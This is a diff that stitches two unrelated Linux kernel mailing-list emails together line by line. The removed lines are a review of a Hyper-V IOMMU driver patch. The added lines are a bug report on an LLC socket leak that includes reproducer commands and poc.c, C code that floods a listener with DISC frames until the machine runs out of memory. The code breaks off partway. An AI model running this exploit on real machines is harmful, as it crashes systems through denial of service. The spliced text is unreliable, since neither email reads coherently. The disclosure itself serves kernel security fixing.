@@ -1,244 +1,894 @@
-Received: from linux.microsoft.com (linux.microsoft.com [13.77.154.182])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 72336346E6D;
-	Thu,  3 Sep 2026 08:01:33 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=13.77.154.182
+Received: from mail-pl1-f176.google.com (mail-pl1-f176.google.com [209.85.214.176])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+	(No client certificate requested)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 706E939E17E
+	for <linux-kernel@vger.kernel.org>; Thu,  3 Sep 2026 08:01:39 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.176
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1788422495; cv=none; b=DhzuW8eg/ItsQ7w7nvQnBsW5Kg/1W6GzWSnV5AsKIr5DW0Or7Jc7Vg1nW5HnIhbEMsx7iaX+6v9rf0FUizEljt4KUU7hfcMdrMzptEqy8GG5AVmrvBZzTXk+FSb5AuTpPjgbYWRb+3tiJcpyMxgirZHnyV/gQpe2uwkr8+FMF6Q=
+	t=1788422502; cv=none; b=pzC30EfwCtMPCCMzslEK1iIWpvDoinM7/LNqlilHHX5LJi+B8seplzqFQnhUbxzS+f0yPjkF0eTVdI5yBAF9I3lHxn2Mwdk+9wN/10SUwVAWasQCKqVPfePc7euokMLmkKStO2XM9f6oONXRh4PamuLq1T6zZNu6zeKAD+rE+dQ=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1788422495; c=relaxed/simple;
-	bh=vpfLl3XOI7rlkVuJq1PgI2vEBKX0lNQYwDmbXu4z21o=;
-	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=Kzu6nisdDDd7jdQyHQETqPPFPUg0SIMEK7GidXJZzJgXDblbg2tbNhcPQ7lPut5cPu1FjLDiHbHxfGv7s/mBhaJUY19GyhUQfwLns5zBiXWs2yJylNcpA8GnMWKIyvuwJ6JWH0/zF5EiC/oUzS9qCMFapu/B9yUwccMftSimLP0=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.microsoft.com; spf=pass smtp.mailfrom=linux.microsoft.com; dkim=pass (1024-bit key) header.d=linux.microsoft.com header.i=@linux.microsoft.com header.b=iuf0Zpbh; arc=none smtp.client-ip=13.77.154.182
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.microsoft.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=linux.microsoft.com
+	s=arc-20240116; t=1788422502; c=relaxed/simple;
+	bh=aISvUzaphZ9FaUBfYsCwahaL6XMhh1apJ7ObdBDl7i4=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=NRK63xEA5nr0UaRdOKIkWZ3SOXGk6Vzg1BRYKvrIO2QUKX1Qj7rdcDSi40gMEBb2h8j6DR0u0URzFPzeGRTpcfqeZe14DRfbt1Pvnib7KhgMLIcqNzeJmi0O2LkEaLLXjfbUJFx/PsXeKw1Mejzon/F8spy5746GCES9fZKlSjE=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=clI5VsJb; arc=none smtp.client-ip=209.85.214.176
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=linux.microsoft.com header.i=@linux.microsoft.com header.b="iuf0Zpbh"
-Received: from localhost (unknown [167.220.233.38])
-	by linux.microsoft.com (Postfix) with ESMTPSA id 47F8F20B712B;
-	Thu,  3 Sep 2026 01:00:54 -0700 (PDT)
-DKIM-Filter: OpenDKIM Filter v2.11.0 linux.microsoft.com 47F8F20B712B
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=linux.microsoft.com;
-	s=default; t=1788422454;
-	bh=nBs8WjtPOPK/iPmNWaCpV8vwPsHWUeve/Fx6Ar0apQE=;
-	h=Date:From:To:Cc:Subject:References:In-Reply-To:From;
-	b=iuf0ZpbhptHZ3cl4mdiP/4Cs20dPAJkKGF4XqAPMA12nffuZxczgkKZQYjeR2BctP
-	 atftrvhceIwIILopc5hfHxR3bKFtt+w1Riclz+/kBPA03AtigMIzyy5EXQyzlUu+tV
-	 f0nnpBM2QTvdnS0chPp0DGX4fSi9HD5b++yxWaa8=
-Date: Thu, 3 Sep 2026 16:01:29 +0800
-From: Yu Zhang <zhangyu1@linux.microsoft.com>
-To: Michael Kelley <mhklinux@outlook.com>
-Cc: "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>, 
-	"linux-hyperv@vger.kernel.org" <linux-hyperv@vger.kernel.org>, "iommu@lists.linux.dev" <iommu@lists.linux.dev>, 
-	"linux-pci@vger.kernel.org" <linux-pci@vger.kernel.org>, "linux-arch@vger.kernel.org" <linux-arch@vger.kernel.org>, 
-	"x86@kernel.org" <x86@kernel.org>, "wei.liu@kernel.org" <wei.liu@kernel.org>, 
-	"kys@microsoft.com" <kys@microsoft.com>, "haiyangz@microsoft.com" <haiyangz@microsoft.com>, 
-	"decui@microsoft.com" <decui@microsoft.com>, "longli@microsoft.com" <longli@microsoft.com>, 
-	"joro@8bytes.org" <joro@8bytes.org>, "will@kernel.org" <will@kernel.org>, 
-	"robin.murphy@arm.com" <robin.murphy@arm.com>, "bhelgaas@google.com" <bhelgaas@google.com>, 
-	"kwilczynski@kernel.org" <kwilczynski@kernel.org>, "lpieralisi@kernel.org" <lpieralisi@kernel.org>, 
-	"mani@kernel.org" <mani@kernel.org>, "robh@kernel.org" <robh@kernel.org>, 
-	"arnd@arndb.de" <arnd@arndb.de>, "jgg@ziepe.ca" <jgg@ziepe.ca>, 
-	"jacob.pan@linux.microsoft.com" <jacob.pan@linux.microsoft.com>, "tgopinath@linux.microsoft.com" <tgopinath@linux.microsoft.com>, 
-	"easwar.hariharan@linux.microsoft.com" <easwar.hariharan@linux.microsoft.com>, "mrathor@linux.microsoft.com" <mrathor@linux.microsoft.com>, 
-	"baolu.lu@linux.intel.com" <baolu.lu@linux.intel.com>, "suravee.suthikulpanit@amd.com" <suravee.suthikulpanit@amd.com>, 
-	"vasant.hegde@amd.com" <vasant.hegde@amd.com>
-Subject: Re: [PATCH v4 4/5] iommu/hyperv: Add para-virtualized IOMMU support
- for Hyper-V guest
-Message-ID: <xgcx7tq47d6wlw7glk7yoka5qr32hxv3rlrdzaw5i2kzs7b7s5@7xdljgmwo77n>
-References: <20260821132654.211730-1-zhangyu1@linux.microsoft.com>
- <20260821132654.211730-5-zhangyu1@linux.microsoft.com>
- <BN7PR02MB41489C44F11D14DDCEF925C7D4AC2@BN7PR02MB4148.namprd02.prod.outlook.com>
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="clI5VsJb"
+Received: by mail-pl1-f176.google.com with SMTP id d9443c01a7336-2d7195706f1so22080335ad.0
+        for <linux-kernel@vger.kernel.org>; Thu, 03 Sep 2026 01:01:39 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1788422499; x=1789027299; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=WvoZQ9wre/wiIXCjMkNMmaYfAjY6Ihba2WKQdi395nM=;
+        b=clI5VsJb32Sc74t/CJv1q1K2NzwrMvZoGPXZ61vLfE34OocX4yIPTIcb53Gmu8U6ve
+         3Op3ViyxnWR3LjAUGPc3SfYsF8ADZO+F9Ck6bhmPBWGvIhDCpJCXoPzetaN4KQMT3SBR
+         +meUwvRnD+F+3iWxLWezRYaLCASyLxDdO5rdyQjvct8Jw66mpdCXwWah4CPzLLZkCJqp
+         ftPM1eQKlvagMBrrkfaMGk5oK+hKSTXF8cxTj81mrV6o7i4sOvIi+Z2e5BkTBVcOUk8N
+         XQ1c8mMv/z97dmPz3ng+Q3UEeKm4goyLm8L/VOUMv0NRpfi3tFO3uaTxRTaHorGd6XJN
+         PRZA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1788422499; x=1789027299;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=WvoZQ9wre/wiIXCjMkNMmaYfAjY6Ihba2WKQdi395nM=;
+        b=fZc95aHbi6vy8drR7tGuPYbsYPbLgXR0HlHnmhriwO/dna4Dl17LzGuX+G8nm9S3Dw
+         +YYbzcj/IQqzyJkQ7qFxuPKWWkj+gdP12ZuKAhlc5+4ZAxSthIqtjj0eimZbtRWcGFmi
+         2hpGcg6AV7vGkhpbtV74GzBDqGVYKpMOjUkDH+Vo4wWqXinMZhlFvCvAl3ZJczS8l7wf
+         lDRRhM9Vs3oP8B5P7Lw+YxZV0AfB1YvGuxGxmY9IJOL/yjmYfYRoFT0hJFF2xK1dcspA
+         F4/mF4hWUB001fIL0wtM9OJUh+xwgjps2dsACIK9J7vKmU/ezg2axGlxuFTkjS0wMLZN
+         F3Pg==
+X-Forwarded-Encrypted: i=1; AKwUvBxZWPY6Wb3nR3zuXmeycZyDqYROzbkqvsCX27JUvJ+ZKcW+7JwkEj+BJNYukLxIXH8We/8lz/zpEcJtjK8=@vger.kernel.org
+X-Gm-Message-State: AFuF++l0FVHMEZvJzL/QPG6jBENZIguHW8Q4kX/VQj6JsJtAsRgzuz5v
+	aHOrywHa0LhcIrQBpX0GKFZwBs+UWnBKLUNgOubolZyi7/9XlKoLSGywxTplIfxPuDaPM08W9nm
+	brnYNoSxQ6sw=
+X-Gm-Gg: AYBFou2v7YVw+gIA0rvTYTXaiQfBn0gFWjTYasI2unYTDY7hM4388TC7irsUuZkpyzz
+	nSPj9vj0TphfRzCnQ3NGKwoGon6aBJXS7Xo17EQD66pjpnkixg5ZEXYzJ11S8smzk0/u3hZGoxX
+	z3+NLxoBdl88rpn9U5rMT4YxP0UZJsgRdNU/Wrv/iwI9N6oMjxu0lvZQQqyGPf2hsL0fl7l7ziD
+	W4/sr1Iur/pz/7cdn5Swp/6R7oWybaFCeCPrNLMCwMJ1/WNH9XzNkHaQQq0d9LipJiwoC8BgGSl
+	TtemrtmWmvI3HVpKeL2AJJD+ETZM3PGpaeIlqGOXcMlBXVw1znnNZVNdKqIyQijHAu2bX2S3sTz
+	MEB1gmv/x718obXe88kRrgJL1EoUv8rD9dxtHtgm7CQH3/nX9Z6sYGAlOCfzyNx7sU/709QDbfI
+	90oZPncMDEQTzYSyxJQdze1Fqsog8FLIbZgTYypHKmkuYyQIKPrtWsAMuOgZC6weDzAZmxGGSoy
+	WsgviWPAzZdxvVPSGjWdk/VxmXDzg==
+X-Received: by 2002:a17:903:3c66:b0:2d8:d4cc:be64 with SMTP id d9443c01a7336-2daec73208cmr168726045ad.17.1788422498298;
+        Thu, 03 Sep 2026 01:01:38 -0700 (PDT)
+Received: from b6ad5085b32f.. ([122.51.212.64])
+        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2dafe0d062fsm6240295ad.5.2026.09.03.01.01.32
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Thu, 03 Sep 2026 01:01:36 -0700 (PDT)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: netdev@vger.kernel.org
+Cc: "David S . Miller" <davem@davemloft.net>,
+	Eric Dumazet <edumazet@google.com>,
+	Jakub Kicinski <kuba@kernel.org>,
+	Paolo Abeni <pabeni@redhat.com>,
+	Simon Horman <horms@kernel.org>,
+	Kees Cook <kees@kernel.org>,
+	linux-kernel@vger.kernel.org,
+	stable@vger.kernel.org,
+	Vega <vega@nebusec.ai>
+Subject: [PATCH net v7 0/1] llc: fix listener child socket leaks before passive open completes
+Date: Thu,  3 Sep 2026 08:01:23 +0000
+Message-ID: <cover.1788414881.git.zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 Precedence: bulk
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Disposition: inline
 Content-Transfer-Encoding: 8bit
-In-Reply-To: <BN7PR02MB41489C44F11D14DDCEF925C7D4AC2@BN7PR02MB4148.namprd02.prod.outlook.com>
 
-On Fri, Aug 28, 2026 at 05:22:25PM +0000, Michael Kelley wrote:
-> From: Yu Zhang <zhangyu1@linux.microsoft.com> Sent: Friday, August 21, 2026 6:27 AM
-> > 
-> > Add a para-virtualized IOMMU driver for Linux guests running on Hyper-V.
-> > This driver implements stage-1 IO translation within the guest OS.
-> > It integrates with the Linux IOMMU core, utilizing Hyper-V hypercalls
-> > for:
-> >  - Capability discovery
-> >  - Domain allocation, configuration, and deallocation
-> >  - Device attachment and detachment
-> >  - IOTLB invalidation
-> > 
-> > The driver constructs x86-compatible stage-1 IO page tables in the
-> > guest memory using consolidated IO page table helpers. This allows
-> > the guest to manage stage-1 translations independently of vendor-
-> > specific drivers (like Intel VT-d or AMD IOMMU).
-> > 
-> > Hyper-V consumes this stage-1 IO page table when a device domain is
-> > created and configured, and nests it with the host's stage-2 IO page
-> > tables, therefore eliminating the VM exits for guest IOMMU mapping
-> > operations. For unmapping operations, VM exits to perform the IOTLB
-> > flush are still unavoidable.
-> > 
-> > Guest hibernation and resume are not supported by this initial
-> > implementation. The guest-owned stage-1 page tables reside in guest
-> > memory and are preserved in the hibernation image. However, the image
-> > does not by itself preserve the Hyper-V device-domain objects or their
-> > device attachments, and the current pvIOMMU interface does not define
-> > whether or how Hyper-V restores that state.
-> > 
-> > To identify a device in its hypercall interface, the driver looks up the
-> > logical device ID prefix registered for the device's PCI domain (see the
-> > logical device ID registry in hv_common.c) and combines it with the PCI
-> > function number of the endpoint device.
-> > 
-> > Co-developed-by: Wei Liu <wei.liu@kernel.org>
-> > Signed-off-by: Wei Liu <wei.liu@kernel.org>
-> > Co-developed-by: Easwar Hariharan <easwar.hariharan@linux.microsoft.com>
-> > Signed-off-by: Easwar Hariharan <easwar.hariharan@linux.microsoft.com>
-> > Signed-off-by: Yu Zhang <zhangyu1@linux.microsoft.com>
-> > Reviewed-by: Jacob Pan <jacob.pan@linux.microsoft.com>
-> > ---
-> >  arch/x86/hyperv/hv_init.c             |   4 +
-> >  arch/x86/include/asm/mshyperv.h       |   4 +
-> >  drivers/iommu/Kconfig                 |   1 +
-> >  drivers/iommu/hyperv/Kconfig          |  16 +
-> >  drivers/iommu/hyperv/Makefile         |   1 +
-> >  drivers/iommu/hyperv/hv-iommu-guest.c | 620 ++++++++++++++++++++++++++
-> >  drivers/iommu/hyperv/iommu.h          |  49 ++
-> >  7 files changed, 695 insertions(+)
-> >  create mode 100644 drivers/iommu/hyperv/Kconfig
-> >  create mode 100644 drivers/iommu/hyperv/hv-iommu-guest.c
-> >  create mode 100644 drivers/iommu/hyperv/iommu.h
-> > 
-> 
-> [snip]
-> 
-> > +
-> > +static int hv_iommu_attach_dev(struct iommu_domain *domain, struct device *dev,
-> > +			       struct iommu_domain *old)
-> > +{
-> > +	u64 status;
-> > +	u32 prefix;
-> > +	unsigned long flags;
-> > +	struct pci_dev *pdev;
-> > +	struct hv_input_attach_device_domain *input;
-> > +	struct hv_iommu_domain *hv_domain = to_hv_iommu_domain(domain);
-> > +	int ret;
-> > +
-> > +	pdev = to_pci_dev(dev);
-> > +	dev_dbg(dev, "attaching to domain %d\n",
-> > +		hv_domain->device_domain.domain_id.id);
-> > +
-> > +	ret = hv_pci_lookup_dev_id(pci_domain_nr(pdev->bus), &prefix);
-> > +	if (ret) {
-> > +		dev_err(&pdev->dev, "no IOMMU registration for vPCI bus\n");
-> 
-> Nit: Given that the device id registration is independent of IOMMUs,
-> this message seems a bit off. Maybe just drop "IOMMU"?
-> 
+Hi Linux kernel maintainers,
 
-How about making the message more explicit and including the lookup key?
-E.g.,
+We found and validated an issue in net/llc/llc_conn.c. The reproducer needs
+CAP_NET_RAW and CAP_NET_ADMIN in init_net.
+We've tested it, and it should not affect any other functionality.
 
-	pci_domain = pci_domain_nr(pdev->bus);
-	ret = hv_pci_lookup_dev_id(pci_domain, &prefix);
-	if (ret) {
-		dev_err(dev,
-			"no logical device ID registered for PCI domain %04x\n",
-			pci_domain);
-		return ret;
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
+
+---- details below ----
+
+Bug details:
+
+llc_conn_handler() creates a passive-open child for every frame matched by an
+LLC listener. The child is immediately inserted in the SAP tables and takes a
+device reference, before the LLC state machine proves that the frame is a real
+passive open and before LLC_CONN_PRIM makes it available to accept().
+
+A non-SABME frame never reaches that indication. The old path therefore leaves
+a published child behind which accept() cannot return. The same lifecycle gap
+also remains for SABME traffic when direct processing, backlog enqueue, or
+backlog processing exits before LLC_CONN_PRIM, and when a listener is closed
+with queued but unaccepted children.
+
+The crash PoC is the DISC path only: a PF_LLC SOCK_STREAM listener plus
+injected DISC commands, each with a unique source MAC. On the original
+unfixed kernel, 100 such frames left 100 leftover entries in
+/proc/net/llc/socket after the listener process exited, and deleting the
+listener interface then stalled in unregister_netdevice because those
+children still held the device. Repeating that traffic until the 2 GB
+guest is exhausted is what produces the panic_on_oom log below. That
+stack is out_of_memory() from a later page fault in the PoC process; it
+does not contain llc_conn_handler().
+
+SABME is a legitimate passive open and is not the crash trigger.
+poc-sabme.c exercises the extra lifecycle paths that share the same
+child publication gap: accept() after SABME, and close() of the listener
+without accept().
+
+The fix creates children only for SABME commands. DISC and other commands that
+need an ADM-state DM reply are answered directly from the listener using the
+packet source address, while other non-SABME traffic is dropped without driving
+the listener state machine.
+
+For SABME, the child remains in the SAP tables during passive open so tuple
+lookup continues to win over the listener. The patch tracks children through
+pending and queued states, routes packets for a pending child through the
+listener-side handshake, and removes any child that has not been accepted when
+a failure, backlog drop, or listener close occurs. Cleanup is not gated on the
+current TCP state, so children are also released if the socket leaves
+TCP_LISTEN before close. Redirected packets that observe SOCK_DEAD on the
+listener also release the pending child in llc_conn_handler(), so that path
+does not depend only on close() draining the backlog. A redirected frame
+that fails to enqueue on the listener backlog is dropped without tearing
+down the already pending child. close() walks the listener's remaining
+incoming children after draining sk_receive_queue, so PENDING sockets
+that never reached the accept queue are still released. Handshake skbs
+keep a child socket reference with skb_set_owner_sk_safe(), so
+kfree_skb() on drop, accept-failure, and close paths cannot race the
+asynchronous teardown destructor. Process-context child-lock acquisition
+is serialized with bottom halves disabled. Final child destruction is
+deferred to process context so its timers can be synchronized safely,
+and that work does not lock the listener. The work orphans the child and
+drops the device reference before llc_sk_free().
+
+The root-cause fact fixed here predates d389424e00f9. Its parent already
+creates a listener-side child, publishes it to the SAP tables before
+LLC_CONN_PRIM, and has no rollback path if processing exits early. In the local
+visible history, the earliest commit where that root-cause fact is already
+present is 1da177e4c3f4 ("Linux-2.6.12-rc2"), so Fixes points there.
+
+This revision drops the follow-up LLC_CONN_OUT_OF_SVC bounds patch. Kees
+Cook posted a more complete net-next series for that overlap, and review
+of v6 2/2 also noted the unlatched state-table index and the possible +1
+connect(2) return. The listener child leak remains independent of that
+series.
+
+PF_LLC sockets can only be created in init_net and need CAP_NET_RAW.
+unshare -Urn is not used, because a user-plus-net namespace rejects
+PF_LLC with EAFNOSUPPORT. The reproducer therefore creates a veth pair
+and injects AF_PACKET frames in init_net.
+
+The reproducer writes panic_on_oom only to turn the final memory
+exhaustion into stable crash evidence after leftover LLC sockets are
+already visible in /proc/net/llc/socket. It is not a prerequisite for
+the leak itself.
+
+packetdrill was not used here because the trigger depends on combining a PF_LLC
+listening socket with raw AF_PACKET injection over a veth pair while rotating
+the source MAC address to force distinct passive-open children. The PoC is
+centered on that listener-plus-raw-packet resource leak path rather than on a
+packetdrill-friendly timing script.
+
+Reproducer:
+
+    gcc -O2 -static -o poc poc.c
+    gcc -O2 -static -o poc-sabme poc-sabme.c
+    ip link add llc_rx0 type veth peer name llc_tx0
+    ip link set llc_rx0 address 02:11:22:33:44:55
+    ip link set llc_tx0 address 02:11:22:33:44:66
+    ip link set llc_rx0 up
+    ip link set llc_tx0 up
+    ./poc llc_rx0 llc_tx0 110000
+
+The crash command above is the DISC injector. The extra SABME paths are:
+
+    ./poc-sabme accept llc_rx0 llc_tx0
+    ./poc-sabme close llc_rx0 llc_tx0 100
+
+For deterministic crash evidence only, after leftover LLC sockets are
+already visible in /proc/net/llc/socket, we additionally set:
+
+    echo 2 > /proc/sys/vm/panic_on_oom
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.c------
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <linux/if_arp.h>
+#include <linux/if_ether.h>
+#include <linux/if_packet.h>
+#include <linux/if.h>
+#include <linux/llc.h>
+#include <net/ethernet.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#ifndef AF_LLC
+#define AF_LLC 26
+#endif
+
+#define DEFAULT_RX_IF "llc_rx0"
+#define DEFAULT_TX_IF "llc_tx0"
+#define DEFAULT_SAP 0xc0
+#define DEFAULT_REPORT_EVERY 10000ULL
+
+static void die_errno(const char *what)
+{
+	perror(what);
+	exit(EXIT_FAILURE);
+}
+
+static void usage(const char *prog)
+{
+	fprintf(stderr,
+		"usage: %s [rx_if] [tx_if] [count]\n"
+		"  rx_if: LLC listener interface (default: %s)\n"
+		"  tx_if: raw packet sender interface (default: %s)\n"
+		"  count: number of DISC frames to send, 0 means forever\n",
+		prog, DEFAULT_RX_IF, DEFAULT_TX_IF);
+}
+
+static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
+{
+	struct ifreq ifr;
+	int fd;
+
+	fd = socket(AF_INET, SOCK_DGRAM, 0);
+	if (fd < 0)
+		die_errno("socket(AF_INET)");
+
+	memset(&ifr, 0, sizeof(ifr));
+	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
+	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
+		die_errno("ioctl(SIOCGIFHWADDR)");
+
+	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
+	close(fd);
+}
+
+static int get_ifindex(const char *ifname)
+{
+	struct ifreq ifr;
+	int fd;
+
+	fd = socket(AF_INET, SOCK_DGRAM, 0);
+	if (fd < 0)
+		die_errno("socket(AF_INET)");
+
+	memset(&ifr, 0, sizeof(ifr));
+	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
+	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
+		die_errno("ioctl(SIOCGIFINDEX)");
+
+	close(fd);
+	return ifr.ifr_ifindex;
+}
+
+static int make_listener(const char *ifname, uint8_t sap, unsigned char mac[ETH_ALEN])
+{
+	struct sockaddr_llc addr;
+	int fd;
+
+	fd = socket(AF_LLC, SOCK_STREAM, 0);
+	if (fd < 0)
+		die_errno("socket(AF_LLC)");
+
+	get_if_hwaddr(ifname, mac);
+
+	memset(&addr, 0, sizeof(addr));
+	addr.sllc_family = AF_LLC;
+	addr.sllc_arphrd = ARPHRD_ETHER;
+	addr.sllc_sap = sap;
+	memcpy(addr.sllc_mac, mac, ETH_ALEN);
+
+	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
+		die_errno("bind(AF_LLC)");
+	if (listen(fd, 16) < 0)
+		die_errno("listen(AF_LLC)");
+
+	return fd;
+}
+
+static int make_packet_socket(const char *ifname, int *ifindex_out)
+{
+	struct sockaddr_ll sll;
+	int fd;
+	int one = 1;
+	int ifindex = get_ifindex(ifname);
+
+	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+	if (fd < 0)
+		die_errno("socket(AF_PACKET)");
+
+	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));
+
+	memset(&sll, 0, sizeof(sll));
+	sll.sll_family = AF_PACKET;
+	sll.sll_protocol = htons(ETH_P_ALL);
+	sll.sll_ifindex = ifindex;
+
+	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
+		die_errno("bind(AF_PACKET)");
+
+	*ifindex_out = ifindex;
+	return fd;
+}
+
+static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
+{
+	mac[0] = 0x02;
+	mac[1] = (n >> 32) & 0xff;
+	mac[2] = (n >> 24) & 0xff;
+	mac[3] = (n >> 16) & 0xff;
+	mac[4] = (n >> 8) & 0xff;
+	mac[5] = n & 0xff;
+}
+
+int main(int argc, char **argv)
+{
+	static unsigned char frame[ETH_ZLEN];
+	unsigned char dst_mac[ETH_ALEN];
+	unsigned char src_mac[ETH_ALEN];
+	struct sockaddr_ll sll;
+	const char *rx_if = DEFAULT_RX_IF;
+	const char *tx_if = DEFAULT_TX_IF;
+	uint64_t count = 0;
+	uint64_t i = 1;
+	int listener_fd;
+	int packet_fd;
+	int ifindex;
+
+	if (argc > 1 && (!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help"))) {
+		usage(argv[0]);
+		return 0;
+	}
+	if (argc > 1)
+		rx_if = argv[1];
+	if (argc > 2)
+		tx_if = argv[2];
+	if (argc > 3) {
+		char *end = NULL;
+
+		errno = 0;
+		count = strtoull(argv[3], &end, 0);
+		if (errno || !end || *end != '\0') {
+			fprintf(stderr, "invalid count: %s\n", argv[3]);
+			return EXIT_FAILURE;
+		}
+	}
+	if (argc > 4) {
+		usage(argv[0]);
+		return EXIT_FAILURE;
 	}
 
-> > +		return ret;
-> > +	}
-> > +
-> > +	local_irq_save(flags);
-> > +
-> > +	input = *this_cpu_ptr(hyperv_pcpu_input_arg);
-> > +	memset(input, 0, sizeof(*input));
-> > +	input->device_domain = hv_domain->device_domain;
-> > +	input->device_id.as_uint64 = (u64)prefix | PCI_FUNC(pdev->devfn);
-> > +	status = hv_do_hypercall(HVCALL_ATTACH_DEVICE_DOMAIN, input, NULL);
-> > +
-> > +	local_irq_restore(flags);
-> > +
-> > +	if (!hv_result_success(status) &&
-> > +	    hv_result(status) != HV_STATUS_DEVICE_ALREADY_IN_DOMAIN) {
-> > +		hv_status_err(status, "HVCALL_ATTACH_DEVICE_DOMAIN failed\n");
-> > +		return hv_result_to_errno(status);
-> > +	}
-> > +
-> > +	if (domain != &hv_blocking_domain.domain &&
-> > +	    !pdev->ats_enabled &&
-> > +	    hv_iommu_ats_supported(hv_iommu_device->cap) &&
-> 
-> Nit: In other places where the hv_domain is available, 
-> hv_domain->hv_iommu is used instead of directly accessing
-> hv_iommu_device. That's a good practice that limits references
-> to the static variable hv_iommu_device in case future enhancements
-> allow multiple IOMMUs in a VM. I'd suggest doing the same here.
-> 
+	listener_fd = make_listener(rx_if, DEFAULT_SAP, dst_mac);
+	packet_fd = make_packet_socket(tx_if, &ifindex);
 
-Good point. Will use hv_domain->hv_iommu.
+	memset(frame, 0, sizeof(frame));
+	memcpy(frame, dst_mac, ETH_ALEN);
+	((struct ethhdr *)frame)->h_proto = htons(3);
+	frame[ETH_HLEN + 0] = DEFAULT_SAP;
+	frame[ETH_HLEN + 1] = 0x04;
+	frame[ETH_HLEN + 2] = 0x43; /* DISC command, P/F=0 */
 
-> > +	    pci_ats_supported(pdev))
-> > +		pci_enable_ats(pdev, PAGE_SHIFT);
-> > +
-> > +	return 0;
-> > +}
-> > +
-> 
-> [snip]
-> 
-> > +
-> > +static struct iommu_device *hv_iommu_probe_device(struct device *dev)
-> > +{
-> > +	struct hv_iommu_endpoint *vdev;
-> > +	struct hv_output_get_logical_device_property device_iommu_property = {0};
-> > +
-> > +	if (!dev_is_pci(dev))
-> > +		return ERR_PTR(-ENODEV);
-> > +
-> > +	if (hv_iommu_get_logical_device_property(dev,
-> > +						 HV_LOGICAL_DEVICE_PROPERTY_PVIOMMU,
-> > +						 &device_iommu_property) ||
-> > +	    !(device_iommu_property.device_iommu & HV_DEVICE_IOMMU_ENABLED))
-> > +		return ERR_PTR(-ENODEV);
-> > +
-> > +	vdev = kzalloc_obj(*vdev, GFP_KERNEL);
-> > +	if (!vdev)
-> > +		return ERR_PTR(-ENOMEM);
-> > +
-> > +	vdev->dev = dev;
-> > +	vdev->hv_iommu = hv_iommu_device;
-> > +	dev_iommu_priv_set(dev, vdev);
-> 
-> This struct hv_iommu_endpoint is set up, but doesn't seem to be
-> used for anything except to free it. Am I missing some reason that
-> it exists?
-> 
+	memset(&sll, 0, sizeof(sll));
+	sll.sll_family = AF_PACKET;
+	sll.sll_ifindex = ifindex;
+	sll.sll_halen = ETH_ALEN;
+	memcpy(sll.sll_addr, dst_mac, ETH_ALEN);
 
-Hah! You aren not missing anything. :)
+	fprintf(stderr,
+		"listener_if=%s sender_if=%s sap=0x%02x count=%s\n",
